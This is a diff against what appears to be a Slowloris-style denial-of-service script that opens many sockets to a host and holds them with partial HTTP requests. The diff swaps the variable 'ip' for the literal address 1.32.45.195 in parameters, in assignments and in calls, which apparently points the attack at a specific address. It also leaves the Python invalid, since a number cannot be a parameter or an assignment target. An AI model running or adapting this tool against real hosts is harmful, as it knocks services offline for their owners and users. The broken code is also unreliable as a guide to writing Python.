@@ -153,7 +153,7 @@ setattr(socket.socket, "send_line", send_line)
 setattr(socket.socket, "send_header", send_header)
 
 
-def init_socket(ip):
+def init_socket(1.32.45.195):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
 
@@ -161,7 +161,7 @@ def init_socket(ip):
         ctx = ssl.create_default_context()
         s = ctx.wrap_socket(s, server_hostname=args.host)
 
-    s.connect((ip, args.port))
+    s.connect((1.32.45.195, args.port))
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
@@ -175,15 +175,15 @@ def init_socket(ip):
 
 
 def main():
-    ip = args.host
+    1.32.45.195 = args.host
     socket_count = args.sockets
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
+    logging.info("Attacking %s with %s sockets.", 1.32.45.195, socket_count)
 
     logging.info("Creating sockets...")
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
+            s = init_socket(1.32.45.195)
         except socket.error as e:
             logging.debug(e)
             break
@@ -204,7 +204,7 @@ def main():
             for _ in range(socket_count - len(list_of_sockets)):
                 logging.debug("Recreating socket...")
                 try:
-                    s = init_socket(ip)
+                    s = init_socket(1.32.45.195)
                     if s:
                         list_of_sockets.append(s)
                 except socket.error as e:
